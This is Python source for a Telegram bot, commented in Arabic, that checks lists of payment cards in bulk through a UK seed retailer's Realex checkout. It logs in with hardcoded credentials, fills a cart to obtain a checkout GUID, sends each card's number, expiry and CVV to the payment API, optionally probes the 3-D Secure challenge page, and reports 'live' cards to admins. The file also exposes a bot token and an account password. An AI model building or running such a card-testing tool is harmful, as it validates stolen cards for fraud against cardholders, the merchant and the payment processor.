# -*- coding: utf-8 -*-
import asyncio
import json
import re
import os
import time
from datetime import datetime

from curl_cffi import requests as curl_requests
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ========== CONFIGURATION ==========
BOT_TOKEN  = "8334507568:AAEJakB6G_kPVNOX6r3vZGc8ZqcLPhOmCLM"
ADMIN_IDS  = [5895491379, 6220135474, 844663875]

LOGIN_EMAIL    = "saad@hotmail.com"
LOGIN_PASSWORD = "111222333Mm"

# ========== AUTO LOGIN ==========
dobies_session = None

def do_login():
    """يسجل الدخول ويرجع session فيها كوكيز حقيقية"""
    global dobies_session
    print("[*] جاري تسجيل الدخول للحصول على كوكيز جديدة...")

    session = curl_requests.Session(impersonate="chrome120")

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-GB,en;q=0.9',
        'origin': 'https://www.dobies.co.uk',
        'referer': 'https://www.dobies.co.uk/sign-in',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    try:
        session.get('https://www.dobies.co.uk/', headers=headers, timeout=20)
        time.sleep(2)  # زيادة الانتظار
        session.get('https://www.dobies.co.uk/sign-in', headers=headers, timeout=20)
        time.sleep(2)

        session.post(
            'https://www.dobies.co.uk/sign-in',
            headers=headers,
            data={'EmailAddress': LOGIN_EMAIL, 'Password': LOGIN_PASSWORD},
            allow_redirects=True,
            timeout=20,
        )
        time.sleep(2)

        account = session.get(
            'https://www.dobies.co.uk/account-management',
            headers={**headers, 'referer': 'https://www.dobies.co.uk/sign-in'},
            timeout=20,
        )

        if 'My Account' in account.text:
            # إضافة منتج للسلة عشان يشتغل GUID في checkout
            print("[*] جاري إضافة منتج للسلة...")
            add_to_cart_headers = {
                'accept': '*/*',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.dobies.co.uk',
                'referer': 'https://www.dobies.co.uk/SUSGW2/peony-pink-hawaiian-coral_mh-76854',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            session.post(
                'https://www.dobies.co.uk/cart-JSON.cfm',
                headers=add_to_cart_headers,
                data = "Quantity=1&addtobasket=1&prodcode=MH322&name=Carrot+'Autumn+King+2'+-+Seeds&sku=433811",
                timeout=20,
            )
            time.sleep(1)
            print("[+] تم إضافة المنتج للسلة.")
            
            # التأكد من أن الـ checkout يشتغل
            checkout_test = session.get(
                'https://www.dobies.co.uk/checkout/delivery',
                headers=headers,
                timeout=20,
            )
            
            if 'guid=' in checkout_test.text or 'checkout' in checkout_test.text.lower():
                dobies_session = session
                print("[+] تسجيل الدخول ناجح! تم تحديث الكوكيز والسيشن جاهز.")
                return True
            else:
                print("[-] الكوكيز شغالة لكن checkout مش واضح!")
                dobies_session = session
                return True
        else:
            print("[-] فشل تسجيل الدخول!")
            return False

    except Exception as e:
        print(f"[-] خطأ في اللوجين: {e}")
        return False


def get_cookies_dict():
    """يرجع الكوكيز كـ dict"""
    global dobies_session
    if dobies_session is None:
        do_login()
    return dict(dobies_session.cookies) if dobies_session else {}


# تسجيل الدخول عند بدء البوت
do_login()


# ========== HEADERS ==========
CHECKOUT_HEADERS = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dnt': '1',
    'priority': 'u=0, i',
    'referer': 'https://pay.realexpayments.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
}

BASE_HEADERS = {
    'Accept': '*/*',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'DNT': '1',
    'Origin': 'https://pay.realexpayments.com',
    'Referer': 'https://pay.realexpayments.com/',  # سيتم تحديثه في كل طلب
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Storage-Access': 'active',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

# ========== SESSION MANAGEMENT ==========
user_sessions = {}

def get_user_stats(user_id):
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'dashboard_message_id': None,
            'chat_id': None,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
            'advanced_mode': False,  # وضع الفحص المتقدم
            'advanced_declined': 0,  # عدد البطاقات المرفوضة بتحقق إضافي
        }
    return user_sessions[user_id]

def reset_user_stats(user_id):
    if user_id in user_sessions:
        advanced_mode = user_sessions[user_id].get('advanced_mode', False)
        user_sessions[user_id].update({
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
            'advanced_mode': advanced_mode,
            'advanced_declined': 0,
        })

# ========== HELPERS ==========
def base_card_data(cc, guid):
    return {
        'pas_cctype': '',  # سيتم تحديده تلقائياً
        'pas_pareq': '', 
        'pas_acsurl': '', 
        'pas_termurl': '',
        'encryptMD': '', 
        'verifyMessage': '', 
        'verifyResult': '', 
        'verifyEnrolled': '',
        'pas_ccnum': cc,
        'cardIdentifyError': '',
        'pas_expiry': '', 
        'pas_cccvc': '', 
        'pas_issuenumber': '', 
        'pas_ccname': '',
        'guid': guid,
        'dccchoice': '', 
        'dccrate': '',
        'hppInstallmentPlanId': '', 
        'hppInstallmentTcVersion': '', 
        'hppInstallmentTcLang': '',
        'browserJavaEnabled': 'false',
        'browserLanguage': 'ar',
        'screenColorDepth': '32',
        'screenHeight': '786',
        'screenWidth': '1397',
        'timezoneUtcOffset': '-120',
        'paymentFormHeight': '660',
        'paymentFormWidth': '600',
    }

# ========== GET GUID مع تجديد تلقائي ==========
async def get_guid_with_retry(loop, stats, max_retries=2):
    """
    يحاول يجلب GUID، لو فشل يجدد الكوكيز ويحاول تاني
    """
    for attempt in range(max_retries):
        cookies = get_cookies_dict()

        resp = await loop.run_in_executor(None, lambda: curl_requests.get(
            'https://www.dobies.co.uk/checkout/delivery',
            cookies=cookies,
            headers=CHECKOUT_HEADERS,
            impersonate="chrome120",
            timeout=30,
        ))

        guid_match = re.search(r'card\.html\?guid=([\w-]+)', resp.text)
        guid = guid_match.group(1) if guid_match else None

        if guid:
            return guid

        # فشل جلب GUID - نجدد الكوكيز
        print(f"[!] فشل جلب GUID (محاولة {attempt+1}/{max_retries}) - جاري تجديد الكوكيز...")
        stats['last_response'] = f'GUID Error - تجديد كوكيز ({attempt+1})'

        # تجديد اللوجين في executor عشان ما يبلوك الـ event loop
        login_ok = await loop.run_in_executor(None, do_login)
        if not login_ok:
            print("[-] فشل تجديد اللوجين!")

        await asyncio.sleep(2)

    return None


# ========== ADVANCED VERIFICATION - التحقق الإضافي ==========
async def advanced_verification(encoded_creq, challenge_url, threeDSSessionData, loop):
    """
    يقوم بالتحقق الإضافي من خلال إرسال طلب لـ arcot.com
    يرجع True إذا كانت البطاقة مرفوضة (Payment went wrong)
    يرجع False إذا كان هناك خطأ أو البطاقة ليست مرفوضة بشكل واضح
    """
    try:
        cookies = {
            'ProxyRACookie': 'c48a0328-4840-4f9c-ab9c-38f329379071',
            'RiskfortCookie': '"x=s1:elsFP1Ukr8aWD+GGg551u0ccgKIIuluJz4/cjmfuxCW2R2LAqdmclypuxrUAJ+6H"',
            'RiskfortTLCCookie': '"x=s1:DcWhqNCRt07/WC8uuIWYEBRI4YD5x5YjG1LKmuiHd5oIgMxShM9iPR3NaR5toAaR"',
            'TransitionCookie': '"x=s1:DcWhqNCRt07/WC8uuIWYEBRI4YD5x5YjG1LKmuiHd5oIgMxShM9iPR3NaR5toAaR"',
            '_cfuvid': 'WCjUVZtrhcxRenwTUTyqcJ_LUVQy.F7BcFBcT1O28Zo-1771969869822-0.0.1.1-604800000',
            '__cflb': '0H28vZL7wce6gLgoY8aSnAZQ2PQZdETgXQWc2hsU5nu',
        }

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://pay.realexpayments.com',
            'priority': 'u=0, i',
            'referer': 'https://pay.realexpayments.com/',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-storage-access': 'active',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        }

        data = {
            'creq': encoded_creq,
            'threeDSSessionData': threeDSSessionData,
        }

        # إرسال الطلب
        response = await loop.run_in_executor(
            None,
            lambda: requests.post(
                challenge_url,
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=20,
            )
        )

        # البحث عن علامات الرفض في الـ HTML
        html_text = response.text.lower()
        
        # علامات الرفض المختلفة (بلغات متعددة)
        decline_indicators = [
            'payment went wrong',
            'mobile number isn\'t registered',
            'need to register your mobile',
            'transaction failed',
            'payment failed',
            'declined',
            'not authorized',
            '支付失败',  # صيني
            '失败',
            'paiement échoué',  # فرنسي
            'zahlung fehlgeschlagen',  # ألماني
        ]

        # فحص وجود أي من علامات الرفض
        for indicator in decline_indicators:
            if indicator in html_text:
                print(f"[!] Advanced Check: Found decline indicator - {indicator}")
                return True
        
        return False

    except Exception as e:
        print(f"[-] خطأ في التحقق الإضافي: {e}")
        return False


# ========== CHECK CARD ==========
async def check_card(card, bot_app, user_id):
    stats = get_user_stats(user_id)
    if not stats['is_running']:
        return

    stats['current_card'] = card
    try:
        parts = card.split('|')
        if len(parts) < 4:
            stats['errors'] += 1
            stats['last_response'] = 'Invalid Format'
            return card, "ERROR"

        cc, mm, yy, cvv = parts[:4]
        if len(yy) == 2:
            yy = "20" + yy
        # صيغة MM/YY للـ expiry
        expiry = f"{mm}/{yy[-2:]}"

        loop = asyncio.get_event_loop()

        # --- جلب GUID ---
        guid = await get_guid_with_retry(loop, stats)
        if not guid:
            stats['errors'] += 1
            stats['last_response'] = 'GUID Error'
            return card, "ERROR"

        # --- إعداد Headers ---
        referer = f'https://pay.realexpayments.com/hosted-payments/blue/card.html?guid={guid}'
        hdrs = BASE_HEADERS.copy()
        hdrs['Referer'] = referer

        # --- STEP 1: verifyEnrolled ---
        await loop.run_in_executor(None, lambda: requests.post(
            'https://pay.realexpayments.com/hosted-payments/blue/3ds2/verifyEnrolled',
            headers=hdrs, 
            data=base_card_data(cc, guid), 
            timeout=20,
        ))

        # --- STEP 2: cardIdentification ---
        await loop.run_in_executor(None, lambda: requests.post(
            'https://pay.realexpayments.com/hosted-payments/blue/api/cardIdentification',
            headers=hdrs, 
            data=base_card_data(cc, guid), 
            timeout=20,
        ))

        # --- STEP 3: auth (الطلب النهائي) ---
        auth_data = base_card_data(cc, guid)
        auth_data.update({
            'pas_expiry': expiry,
            'pas_cccvc': cvv,
            'pas_ccname': 'saad',
        })

        resp = await loop.run_in_executor(None, lambda: requests.post(
            'https://pay.realexpayments.com/hosted-payments/blue/api/auth',
            headers=hdrs, 
            data=auth_data, 
            timeout=30,
        ))
        
        data = resp.json()

        # --- تحليل النتيجة ---
        verify_result = (data.get('data', {}) or {}).get('verifyEnrolledResult', {}) or {}
        encoded_creq = verify_result.get('encodedCreq')
        challenge_url = verify_result.get('challengeRequestUrl')
        threeDSSessionData = verify_result.get('threeDSSessionData')

        if encoded_creq:
            # البطاقة عندها 3D - نفحص لو الوضع المتقدم مفعّل
            
            # التحقق الإضافي (إذا كان الوضع المتقدم مفعّل)
            if stats.get('advanced_mode') and challenge_url:
                print(f"[*] Advanced mode - verifying 3D card {cc[:6]}****{cc[-4:]}...")
                is_declined = await advanced_verification(
                    encoded_creq, 
                    challenge_url, 
                    threeDSSessionData, 
                    loop
                )
                
                if is_declined:
                    # البطاقة 3D لكن مرفوضة بعد التحقق الإضافي
                    stats['advanced_declined'] += 1
                    stats['failed'] += 1
                    stats['last_response'] = 'ADV-DECLINED (3D Failed) ❌'
                    print(f"[!] Card {cc[:6]}****{cc[-4:]} - 3D but declined after verification!")
                    return card, "DECLINE"
                else:
                    # البطاقة 3D وناجحة
                    stats['success_3ds'] += 1
                    stats['success_cards'].append(card)
                    stats['last_response'] = '3D ✅ (Verified)'
                    await send_result(bot_app, card, "3D", user_id)
                    return card, "3D"
            else:
                # وضع عادي - نعتبرها 3D مباشرة
                stats['success_3ds'] += 1
                stats['success_cards'].append(card)
                stats['last_response'] = '3D ✅'
                await send_result(bot_app, card, "3D", user_id)
                return card, "3D"
        else:
            # البطاقة مرفوضة بدون 3D
            result_code = (data.get('data', {}) or {}).get('response', {}) or {}
            code = result_code.get('result', data.get('status', '?'))
            
            stats['failed'] += 1
            stats['last_response'] = f'DECLINE ({code})'
            return card, "DECLINE"

    except Exception as e:
        stats['errors'] += 1
        stats['last_response'] = f'Error: {str(e)[:30]}'
        return card, "ERROR"


async def send_result(bot_app, card, status_type, user_id):
    stats = get_user_stats(user_id)
    if status_type == "3D":
        mode_text = "🔍 ADVANCED (Verified)" if stats.get('advanced_mode') else "⚡ STANDARD"
        verification_note = "\n✅ *Passed Advanced Verification*" if stats.get('advanced_mode') else ""
        
        text = (
            f"✅ *3D SECURE*\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"💳 `{card}`\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🟢 *Status:* LIVE - 3D Enrolled\n"
            f"📊 *Mode:* {mode_text}{verification_note}"
        )
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text=text,
            parse_mode='Markdown'
        )

# ========== DASHBOARD ==========
def create_dashboard_keyboard(user_id):
    stats = get_user_stats(user_id)
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)

    # إضافة معلومات الوضع المتقدم
    mode_icon = "🔍" if stats.get('advanced_mode') else "⚡"
    mode_text = "ADV" if stats.get('advanced_mode') else "STD"

    keyboard = [
        [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="noop")],
        [
            InlineKeyboardButton(f"🔄 Checking: {stats['checking']}", callback_data="noop"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="noop"),
        ],
        [
            InlineKeyboardButton(f"✅ 3DS: {stats['success_3ds']}", callback_data="noop"),
            InlineKeyboardButton(f"❌ Declined: {stats['failed']}", callback_data="noop"),
        ],
        [
            InlineKeyboardButton(f"🚫 Errors: {stats['errors']}", callback_data="noop"),
            InlineKeyboardButton(f"📊 Done: {stats['cards_checked']}/{stats['total']}", callback_data="noop"),
        ],
        [InlineKeyboardButton(f"{mode_icon} Mode: {mode_text} | 📡 {stats['last_response']}", callback_data="noop")],
    ]

    # إضافة معلومات التحقق الإضافي إذا كان الوضع المتقدم مفعّل
    if stats.get('advanced_mode') and stats.get('advanced_declined', 0) > 0:
        keyboard.append([
            InlineKeyboardButton(f"🔍 Adv. Declined: {stats['advanced_declined']}", callback_data="noop")
        ])

    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔍 {stats['current_card']}", callback_data="noop")])

    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 Stop", callback_data="stop_check")])

    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app, user_id):
    stats = get_user_stats(user_id)
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            mode_text = "🔍 ADVANCED MODE" if stats.get('advanced_mode') else "⚡ STANDARD MODE"
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text=f"📊 *DOBIES CHECKER* 📊\n{mode_text}",
                reply_markup=create_dashboard_keyboard(user_id),
                parse_mode='Markdown'
            )
        except Exception:
            pass

# ========== PROCESS CARDS ==========
CONCURRENT_CHECKS = 3  # عدد الكروت المتوازية - غيره لـ 5 أو 10 حسب ما تريد

async def process_single_card(card, bot_app, user_id, semaphore):
    stats = get_user_stats(user_id)
    if not stats['is_running']:
        return
    async with semaphore:
        if not stats['is_running']:
            return
        stats['checking'] = min(stats['checking'] + 1, CONCURRENT_CHECKS)
        await check_card(card, bot_app, user_id)
        stats['cards_checked'] += 1
        stats['checking'] = max(stats['checking'] - 1, 0)

async def process_cards(cards, bot_app, user_id):
    stats = get_user_stats(user_id)
    semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)

    async def dashboard_loop():
        while stats['is_running']:
            await update_dashboard(bot_app, user_id)
            await asyncio.sleep(1)

    dash_task = asyncio.create_task(dashboard_loop())

    tasks = [
        asyncio.create_task(process_single_card(card, bot_app, user_id, semaphore))
        for card in cards
    ]
    await asyncio.gather(*tasks)

    dash_task.cancel()

    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app, user_id)

    # ارسال ملف الـ 3D
    if stats['success_cards']:
        success_text = "\n".join(stats['success_cards'])
        filename = f"3ds_{user_id}_{int(datetime.now().timestamp())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(success_text)
        
        mode_text = "🔍 Advanced Mode" if stats.get('advanced_mode') else "⚡ Standard Mode"
        caption_text = f"✅ *3DS Live Cards* - {len(stats['success_cards'])} cards\n📊 {mode_text}"
        
        if stats.get('advanced_mode') and stats.get('advanced_declined', 0) > 0:
            caption_text += f"\n🔍 Advanced Declined: {stats['advanced_declined']}"
        
        await bot_app.bot.send_document(
            chat_id=stats['chat_id'],
            document=open(filename, "rb"),
            caption=caption_text,
            parse_mode='Markdown'
        )
        os.remove(filename)


# ========== TELEGRAM HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Unauthorized")
        return
    await update.message.reply_text(
        "╔═══════════════════════╗\n"
        "🚀 *DOBIES CC CHECKER* 🚀\n"
        "╚═══════════════════════╝\n\n"
        "📄 ابعت ملف `.txt` فيه الكروت\n"
        "📌 Format: `number|MM|YYYY|CVV`\n\n"
        "✅ بيبعت رسالة فقط لو *3D LIVE*\n"
        "❌ الرفض مش بيبعت رسالة\n\n"
        "🔍 *وضع الفحص المتقدم متاح الآن!*",
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Unauthorized")
        return

    user_id = update.effective_user.id
    stats = get_user_stats(user_id)

    if stats['is_running']:
        await update.message.reply_text("⚠️ في فحص شغال دلوقتي! وقفه الاول.")
        return

    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]

    if not cards:
        await update.message.reply_text("الملف فاضي!")
        return

    # عرض خيار الفحص (عادي أو متقدم)
    keyboard = [
        [
            InlineKeyboardButton("⚡ فحص عادي (سريع)", callback_data=f"check_mode:standard:{len(cards)}"),
            InlineKeyboardButton("🔍 فحص متقدم (دقيق)", callback_data=f"check_mode:advanced:{len(cards)}"),
        ]
    ]
    
    # حفظ الكروت مؤقتاً
    context.user_data['pending_cards'] = cards
    
    await update.message.reply_text(
        "🎯 *اختر نوع الفحص:*\n\n"
        "⚡ *فحص عادي:* سريع - يفحص 3D فقط\n"
        "🔍 *فحص متقدم:* دقيق - يفحص 3D + تحقق إضافي للرفض\n\n"
        f"📊 عدد الكروت: {len(cards)}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("Unauthorized", show_alert=True)
        return
    
    try:
        await query.answer()
    except Exception:
        pass

    user_id = query.from_user.id
    stats = get_user_stats(user_id)

    # التعامل مع اختيار نوع الفحص
    if query.data.startswith("check_mode:"):
        parts = query.data.split(":")
        mode = parts[1]  # standard أو advanced
        card_count = int(parts[2])
        
        # جلب الكروت المحفوظة
        cards = context.user_data.get('pending_cards', [])
        if not cards:
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="❌ خطأ: الكروت غير موجودة. جرب تبعت الملف تاني.",
                parse_mode='Markdown'
            )
            return
        
        # تعيين الوضع
        reset_user_stats(user_id)
        stats['advanced_mode'] = (mode == 'advanced')
        stats.update({
            'total': len(cards),
            'start_time': datetime.now(),
            'is_running': True,
            'chat_id': query.message.chat_id,
        })
        
        mode_text = "🔍 فحص متقدم (Advanced)" if stats['advanced_mode'] else "⚡ فحص عادي (Standard)"
        
        # تعديل الرسالة
        await query.edit_message_text(
            f"✅ تم اختيار: *{mode_text}*\n"
            f"📊 عدد الكروت: {len(cards)}\n"
            f"🚀 جاري بدء الفحص...",
            parse_mode='Markdown'
        )
        
        # إنشاء لوحة المعلومات
        dashboard_msg = await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=f"📊 *DOBIES CHECKER* 📊\n{mode_text}",
            reply_markup=create_dashboard_keyboard(user_id),
            parse_mode='Markdown'
        )
        stats['dashboard_message_id'] = dashboard_msg.message_id
        
        # بدء الفحص
        asyncio.create_task(process_cards(cards, context.application, user_id))
        
        # حذف الكروت المؤقتة
        del context.user_data['pending_cards']
        return

    # التعامل مع إيقاف الفحص
    if query.data == "stop_check" and stats['is_running']:
        stats['is_running'] = False
        stats['last_response'] = 'Stopped'
        await update_dashboard(context.application, user_id)
        await context.application.bot.send_message(
            chat_id=stats['chat_id'],
            text="🛑 *تم ايقاف الفحص*",
            parse_mode='Markdown'
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    print("[+] Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
